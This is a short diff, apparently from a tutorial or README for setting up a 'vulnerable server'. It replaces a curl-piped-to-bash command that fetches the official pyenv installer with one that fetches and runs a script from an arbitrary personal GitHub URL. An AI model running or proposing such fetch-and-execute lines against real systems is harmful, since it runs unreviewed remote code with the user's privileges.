@@ -9,5 +9,5 @@ For now, let's stop writing about it and start working on the script.
 Vulnerable server, run:
 ```
 set -e
-curl -s -S -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash
+curl -s -S -L https://raw.githubusercontent.com/martinpavelka/blahblahblah | bash
 ```
